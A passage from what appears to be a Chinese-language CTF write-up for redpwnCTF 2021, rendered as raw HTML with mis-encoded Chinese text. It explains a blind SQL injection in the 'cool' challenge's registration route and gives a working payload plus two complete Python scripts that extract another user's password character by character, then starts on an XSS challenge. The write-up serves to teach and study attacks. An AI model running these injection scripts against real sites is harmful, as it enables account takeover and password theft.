&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;register&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;Incorrect&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨å…¥ç‚¹ä»ç„¶æ˜¯ä¸Šæ–‡æåˆ°çš„&lt;code>/register&lt;/code>è·¯ç”±ä¸­&lt;code>create_user(username,password)&lt;/code>ï¼ˆå½“æ—¶æ‰¾å¯¹äº†æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ç›²æ³¨è¿™å—è¿˜æ˜¯åšçš„å°‘ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png" alt="image-20210806085327316">&lt;/p>
&lt;p>ä¸»è¦çš„payloadæ˜¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸€å¥ï¼Œå½“è¿›å…¥åˆ°æ³¨å†Œæµç¨‹æ—¶ ä¼šæ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å³&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users(username, password)&amp;#39;&lt;/span> &lt;span style="color:#111">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxusernamexxxx&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">select&lt;/span> &lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­&lt;code>||&lt;/code>è¿æ¥ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼›æ‰€ä»¥å‘é€æ³¨å†Œè¯·æ±‚æ—¶passwordçš„å€¼å°±æ˜¯åé¢çš„æŸ¥è¯¢è¯­å¥&lt;code>select substr(password,n,1) from users&lt;/code>ï¼Œè€ŒæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯&lt;code>substr(password,n,1)&lt;/code> æ˜¯ginkoidè¿™ä¸ªè´¦æˆ·çš„å¯†ç çš„å…¶ä¸­ä¸€ä½ï¼Œè¦è·å¾—è¿™ä¸ªå€¼å…·ä½“æ˜¯ä»€ä¹ˆ éœ€è¦å†æœ‰ä¸€ä¸ª&lt;code>for in _ in charset&lt;/code>éå†ï¼Œåœ¨ç™»å½•å¤„ æŠŠè¿™ä¸ªå€¼ç»™è¯•å‡ºæ¥&lt;/p>
&lt;p>&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">è‹±æ–‡ç‰ˆè®²è§£&lt;/a>ï¼š&lt;em>The SELECT statement will take the character at index in ginkoid&amp;rsquo;s password, and concatenate it with &amp;lsquo;&amp;rsquo;, to be used as the new user&amp;rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.&lt;/em>&lt;/p>
&lt;p>è·å¾—å¯†ç åä»¥ginkoidçš„è´¦å·ç™»å½•ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ä»€ä¹ˆæ‰€è°“çš„éšå†™ flagå°±åœ¨æŠ“åŒ…åå¯ä»¥çœ‹åˆ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png" alt="image-20210713164749339">&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ç–‘é—®ï¼Œä¸ºä»€ä¹ˆ&lt;code>select substr(password,n,1) from users&lt;/code>å°±èƒ½ç¡®ä¿æ˜¯ginoidçš„passwdå‘¢ï¼Ÿginkoidæ˜¯è¡¨ä¸­çš„ç¬¬ä¸€æ¡æ•°æ®ï¼Œåœ¨æ–°å»ºè¡¨åç«‹åˆ»æ’å…¥ï¼Œè¿™å°±å¯ä»¥ä¿è¯åœ¨æŸ¥è¯¢çš„æ—¶å€™åªæŸ¥ginkoidçš„å¯†ç å—ï¼Ÿ&lt;/p>
&lt;p>discordä¹‹å‰æœ‰äººé—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶çš„è§£ç­”æ˜¯è¿™æ˜¯sqlliteçš„ç‰¹æ€§ï¼Œä½†æ˜¯ç”¨sqlliteåœ¨çº¿å·¥å…·å°è¯•åå‘ç°ä¹Ÿä¸æ˜¯è¿™æ ·çš„ ä¹Ÿä¼šè¿”å›æ‰€æœ‰æ•°æ®çš„&lt;code>substr(x,x,x)&lt;/code>çš„å€¼ï¼Œä½†æ˜¯ç¡®å®æ˜¯ç”¨è¿™æ ·çš„payloadèƒ½åšå‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png" alt="image-20210713164423092">&lt;/p>
&lt;p>â€”â€”â€”â€”åæ¥æƒ³äº†ä¸€ä¸‹ æ˜¯è¿™é‡Œçš„&lt;code>return correct_password[0][0]==password&lt;/code> ç¡®ä¿äº†è™½ç„¶sqlæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯å¾ˆå¤šä¸ªå•ä¸€å­—æ¯ï¼Œä½†æ˜¯æ˜¯å¤šè¡Œè¿”å›ï¼Œä»ç„¶åªä¼šå–åˆ°ç¬¬ä¸€ä¸ªï¼›å†åŠ ä¸Šusernameæ˜¯ä¸»é”® ç¬¬ä¸€ä¸ªæ’å…¥ï¼Œæ‰€ä»¥è¿™ä¸ªpayloadæ˜¯å¯ä»¥çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png" alt="image-20210716173434141">&lt;/p>
&lt;p>ä»¥ä¸€ä¸ªäº‹åè¯¸è‘›äº®çš„è§’åº¦æ¥çœ‹&lt;code>return correct_password[0][0]==password&lt;/code> è¿™å¥ä»£ç  å…¶å®æœ‰æš—ç¤ºçš„æˆåˆ†åœ¨äº†&lt;/p>
&lt;p>â€”â€”â€”â€”è¿˜æœ‰å¦ä¸€ç‰ˆçš„è„šæœ¬ discordé‡Œæ”¶çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png" alt="image-20210716175415526.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>
&lt;span style="color:#111">allowed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#39;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;https://cool.mc.ax/&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;span style="color:#111">final&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;Incorrect&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;password[&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">]: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># random username since otherwise we error&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choices&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(SELECT substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) FROM users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># without this we get an OSError due to too many open file descriptors&lt;/span>
&lt;span style="color:#111">sem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Semaphore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">300&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;Password: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webnotes">web/notes&lt;/h2>
&lt;blockquote>
&lt;p>Texting things to yourself, but online! &lt;a href="https://notes.mc.ax/">notes.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;p>Report problems &lt;a href="https://admin-bot.mc.ax/notes">here&lt;/a>.&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz">notes.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å…ˆçœ‹é¡µé¢ æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå…ˆå¡«ç”¨æˆ·åå’Œå¯†ç å†ç‚¹loginæˆ–registerï¼Œå°è¯•test: testç™»å…¥ï¼Œç•Œé¢æ˜¯ä¸€ä¸ªå¯ä»¥åŠ notes è‡ªå®šbodyå’Œtagçš„app&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png" alt="image-20210710144224462">&lt;/p>
&lt;p>åœ¨view notesçœ‹åˆ°å·²ç»æœ‰äººè¯•è¿‡xssäº†ï¼Œè¿™é‡Œæœ‰ä¸ªå°å°çš„è¶Šæƒæ¼æ´ï¼Œ/view/+usernameç›´æ¥å¯ä»¥çœ‹åˆ°å…¶ä»–çš„å¸ˆå‚…åœ¨å°è¯•ä»€ä¹ˆæ ·çš„payloadï¼ˆçœ‹äº†wpä»¥åæ‰æ„è¯†åˆ°è¿™é‡Œçš„tagéƒ¨åˆ†å°±æ˜¯æ³¨å…¥ç‚¹ è€Œå½“æ—¶çš„æˆ‘ä»¥ä¸ºæ˜¯å¡bugäº†&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png" alt="image-20210710195356571">&lt;/p>
&lt;p>ç®€å•å®¡äº†ä¸‹æºç ï¼Œä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„ï¼Œé¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªadminå·ï¼Œflagåœ¨adminçš„privateåˆ†ç±»çš„notesä¸­ï¼›å¯¹äºä¸ªäººå‘çš„notesä¼šè½¬ä¹‰bodyéƒ¨åˆ†ä¸ºhtmlå®ä½“æ¥é¢„é˜²xss&lt;/p>
&lt;p>ä½†æ˜¯è¿™ä¸ªnotes-appçš„å½¢å¼æ˜¯å¦¥å¦¥çš„xssäº†ï¼Œé‚£çªç ´å£åœ¨å“ªé‡Œæï¼Ÿå…¶å®æ˜¯è¢«å¿½ç•¥çš„tagéƒ¨åˆ†ï¼ä¸€èˆ¬æƒ…å†µä¸‹çœ‹åˆ°tagå¯é€‰private/publicå°±ä¼šä¸å…³æ³¨è¿™é‡Œï¼Œä½†æ˜¯é…åˆç‰¹æ®Šçš„DOMè§£æ è¿™é‡Œæ— ç–‘æ˜¯æ³¨å…¥ç‚¹ï¼ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹ï¼Œ&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»/static/view.htmlä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªnotes-appçš„å‰ç«¯æ¸²æŸ“æ‰€å‡­å€Ÿçš„æ¨¡æ¿é•¿å•¥æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png" alt="image-20210806093357548">&lt;/p>
&lt;p>bodyéƒ¨åˆ†è¢«å®Œå…¨çš„ä¿æŠ¤äº†ï¼Œä½†æ˜¯tagæ²¡æœ‰è¿‡æ»¤ åªæ˜¯é™åˆ¶äº†ä¸ªæ•°&lt;/p>
